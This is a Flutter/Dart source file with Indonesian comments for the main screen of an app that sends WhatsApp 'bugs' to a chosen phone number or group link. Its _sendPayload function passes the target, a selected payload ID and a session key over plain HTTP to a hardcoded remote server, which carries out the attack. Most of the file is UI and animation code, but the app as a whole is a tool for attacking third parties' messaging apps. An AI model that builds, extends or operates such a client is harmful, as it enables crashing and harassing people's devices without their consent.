import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart'; // Wajib ada untuk background video

class HomePage extends StatefulWidget {
  final bool isGroup; // Mode: false = Contact, true = Group
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;

  const HomePage({
    super.key,
    required this.isGroup,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.sessionKey,
    required this.listBug,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  // Controller Video & Input
  late VideoPlayerController _videoController;
  final inputController = TextEditingController();
  
  // Controller Animasi
  late AnimationController _slideController;
  late AnimationController _pulseController;
  late Animation<Offset> _slideAnimation;

  String selectedBugId = "";
  bool _isSending = false;
  bool _isVideoInitialized = false;

  // Palet Warna
  final Color deepRed = const Color(0xFF4A148C);
  final Color mainRed = const Color(0xFF6A1B9A);
  final Color accentRed = const Color(0xFF9C27B0);

  @override
  void initState() {
    super.initState();
    
    // 1. SETUP VIDEO BACKGROUND (Langsung di halaman ini)
    _videoController = VideoPlayerController.asset("assets/videos/vann.mp4")
      ..initialize().then((_) {
        setState(() {
          _isVideoInitialized = true;
        });
        _videoController.setLooping(true);
        _videoController.setVolume(0); // Mute
        _videoController.play();
      });

    // 2. Setup Animasi Slide (Konten masuk dari bawah)
    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..forward();

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.3),
      end: Offset.zero,
    ).animate(CurvedAnimation(
      parent: _slideController,
      curve: Curves.easeOutCubic,
    ));

    // 3. Setup Animasi Pulse (Denyut Tombol)
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    // Default Bug Selection
    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }
  }

  @override
  void dispose() {
    _videoController.dispose(); // Hapus video agar tidak leak
    _slideController.dispose();
    _pulseController.dispose();
    inputController.dispose();
    super.dispose();
  }

  // --- LOGIKA PENGIRIMAN ---
  Future<void> _sendPayload() async {
    final input = inputController.text.trim();

    if (input.isEmpty) {
      _showPopup("Error", "Input tidak boleh kosong!", isError: true);
      return;
    }
    
    if (widget.isGroup && !input.contains("chat.whatsapp.com")) {
      _showPopup("Invalid Link", "Link Group tidak valid!", isError: true);
      return;
    }

    setState(() => _isSending = true);

    try {
      final endpoint = widget.isGroup ? "sendGroupBug" : "sendBug";
      final paramName = widget.isGroup ? "link" : "target";
      final encodedInput = widget.isGroup ? Uri.encodeComponent(input) : input;

      final url = "http://dianaxyz-offc.hostingercloud.web.id:4042/$endpoint?key=${widget.sessionKey}&$paramName=$encodedInput&bug=$selectedBugId";
      
      final res = await http.get(Uri.parse(url));
      final data = jsonDecode(res.body);

      bool isSuccess = false;
      String msg = "";

      if (widget.isGroup) {
        if (data["sended"] == true) {
          isSuccess = true;
          msg = "Bug berhasil dikirim ke Group!";
        } else {
          msg = data["message"] ?? "Gagal mengirim ke group.";
        }
      } else {
        if (data["cooldown"] == true) {
          msg = "Cooldown: Tunggu ${data['wait']} detik.";
        } else if (data["valid"] == false) {
          msg = "Sesi Invalid.";
        } else if (data["sended"] == false) {
          msg = "Gagal: Server Maintenance.";
        } else {
          isSuccess = true;
          msg = "Bug berhasil dikirim ke Target!";
        }
      }

      if (isSuccess) {
        _showPopup("Success", msg, isError: false);
        if (!widget.isGroup) inputController.clear();
      } else {
        _showPopup("Failed", msg, isError: true);
      }

    } catch (e) {
      _showPopup("Connection Error", "Gagal menghubungi server.", isError: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showPopup(String title, String message, {bool isError = false}) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: AlertDialog(
          backgroundColor: const Color(0xFF111111).withOpacity(0.95),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: isError ? deepRed : mainRed, width: 1.5),
          ),
          title: Row(
            children: [
              Icon(
                isError ? Icons.error_outline : Icons.check_circle_outline, 
                color: isError ? accentRed : Colors.greenAccent
              ),
              const SizedBox(width: 10),
              Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ],
          ),
          content: Text(message, style: const TextStyle(color: Colors.white70)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("OK", style: TextStyle(color: accentRed)),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold( // Gunakan Scaffold agar layout aman
      backgroundColor: Colors.black, // Fallback color
      body: Stack(
        children: [
          // 1. VIDEO BACKGROUND (Full Screen)
          if (_isVideoInitialized)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: Colors.black), // Hitam jika video belum load

          // 2. OVERLAY GELAP (Agar teks terbaca)
          Container(
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.6), // Gelap transparan
            ),
          ),

          // 3. KONTEN UTAMA
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              child: SlideTransition(
                position: _slideAnimation,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    // --- CARD PROFIL ---
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(20),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.08), // Efek Kaca
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(color: Colors.white.withOpacity(0.2)),
                        boxShadow: [
                          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 15)
                        ],
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(20),
                        child: BackdropFilter(
                          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                          child: Row(
                            children: [
                              // Foto Profil
                              Container(
                                padding: const EdgeInsets.all(3),
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  border: Border.all(color: accentRed, width: 2),
                                ),
                                child: const CircleAvatar(
                                  radius: 32,
                                  backgroundImage: AssetImage('assets/images/icon.jpg'),
                                ),
                              ),
                              const SizedBox(width: 15),
                              
                              // Info User & Role
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    const Text("Regards,", 
                                      style: TextStyle(color: Colors.white70, fontSize: 12)
                                    ),
                                    Text(
                                      widget.username,
                                      style: const TextStyle(
                                        color: Colors.white,
                                        fontWeight: FontWeight.bold,
                                        fontSize: 22,
                                        fontFamily: 'Orbitron',
                                      ),
                                    ),
                                    const SizedBox(height: 8),
                                    
                                    // Label Role (Di dalam layout)
                                    Container(
                                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
                                      decoration: BoxDecoration(
                                        color: mainRed.withOpacity(0.6),
                                        borderRadius: BorderRadius.circular(8),
                                        border: Border.all(color: accentRed.withOpacity(0.5)),
                                      ),
                                      child: Text(
                                        widget.role.toUpperCase(),
                                        style: const TextStyle(
                                          color: Colors.white,
                                          fontWeight: FontWeight.bold,
                                          fontSize: 11,
                                          letterSpacing: 1,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),

                    const SizedBox(height: 35),

                    // --- INPUT AREA ---
                    Row(
                      children: [
                        Icon(widget.isGroup ? Icons.link : Icons.phone_android, color: accentRed),
                        const SizedBox(width: 10),
                        Text(
                          widget.isGroup ? "Group Link" : "Target Number",
                          style: const TextStyle(
                            color: Colors.white, 
                            fontWeight: FontWeight.bold, 
                            fontSize: 16
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 10),
                    
                    Container(
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(15),
                        border: Border.all(color: Colors.white.withOpacity(0.2)),
                      ),
                      child: TextField(
                        controller: inputController,
                        style: const TextStyle(color: Colors.white),
                        cursorColor: accentRed,
                        decoration: InputDecoration(
                          hintText: widget.isGroup ? "https://chat.whatsapp.com/..." : "628xxxxxxxx",
                          hintStyle: TextStyle(color: Colors.grey[500]),
                          border: InputBorder.none,
                          contentPadding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                          suffixIcon: IconButton(
                            icon: const Icon(Icons.clear, color: Colors.white54),
                            onPressed: inputController.clear,
                          )
                        ),
                      ),
                    ),

                    const SizedBox(height: 25),

                    // --- DROPDOWN AREA ---
                    Row(
                      children: [
                        const Icon(Icons.bug_report, color: Colors.greenAccent),
                        const SizedBox(width: 10),
                        const Text(
                          "Select Payload",
                          style: TextStyle(
                            color: Colors.white, 
                            fontWeight: FontWeight.bold, 
                            fontSize: 16
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 10),

                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(15),
                        border: Border.all(color: Colors.white.withOpacity(0.2)),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          dropdownColor: const Color(0xFF1A1A1A),
                          value: selectedBugId,
                          isExpanded: true,
                          icon: Icon(Icons.arrow_drop_down, color: accentRed),
                          style: const TextStyle(color: Colors.white, fontSize: 15),
                          items: widget.listBug.map((bug) {
                            return DropdownMenuItem<String>(
                              value: bug['bug_id'],
                              child: Text(
                                bug['bug_name'],
                                style: const TextStyle(color: Colors.white),
                              ),
                            );
                          }).toList(),
                          onChanged: (val) => setState(() => selectedBugId = val!),
                        ),
                      ),
                    ),

                    const SizedBox(height: 35),

                    // --- DECORATION ICONS ---
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                      children: [
                        _buildFeatureIcon(Icons.local_fire_department, Colors.orange),
                        _buildFeatureIcon(Icons.security, Colors.blue),
                        _buildFeatureIcon(Icons.dns, Colors.purple),
                      ],
                    ),

                    const SizedBox(height: 35),

                    // --- SEND BUTTON (Pulse Animation) ---
                    AnimatedBuilder(
                      animation: _pulseController,
                      builder: (context, child) {
                        return Container(
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(15),
                            boxShadow: [
                              BoxShadow(
                                color: deepRed.withOpacity(0.3 * _pulseController.value),
                                blurRadius: 15 * _pulseController.value,
                                spreadRadius: 2 * _pulseController.value,
                              ),
                            ],
                          ),
                          child: child,
                        );
                      },
                      child: SizedBox(
                        width: double.infinity,
                        height: 55,
                        child: ElevatedButton(
                          onPressed: _isSending ? null : _sendPayload,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.transparent,
                            padding: EdgeInsets.zero,
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
                            elevation: 0,
                          ),
                          child: Ink(
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                colors: [deepRed, accentRed],
                                begin: Alignment.centerLeft,
                                end: Alignment.centerRight
                              ),
                              borderRadius: BorderRadius.circular(15),
                              boxShadow: [
                                BoxShadow(
                                  color: mainRed.withOpacity(0.5), 
                                  blurRadius: 15, 
                                  offset: const Offset(0, 4)
                                )
                              ],
                            ),
                            child: Container(
                              alignment: Alignment.center,
                              child: _isSending
                                  ? const SizedBox(
                                      width: 24, 
                                      height: 24, 
                                      child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2)
                                    )
                                  : Row(
                                      mainAxisAlignment: MainAxisAlignment.center,
                                      children: [
                                        const Icon(Icons.send, color: Colors.white),
                                        const SizedBox(width: 10),
                                        const Text(
                                          "Send Bug",
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontWeight: FontWeight.bold,
                                            fontSize: 16,
                                            letterSpacing: 1,
                                          ),
                                        ),
                                      ],
                                    ),
                            ),
                          ),
                        ),
                      ),
                    ),
                    
                    const SizedBox(height: 100), // Spasi bawah
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildFeatureIcon(IconData icon, Color color) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: color.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(color: color.withOpacity(0.1), blurRadius: 8)
        ]
      ),
      child: Icon(icon, color: color, size: 28),
    );
  }
}

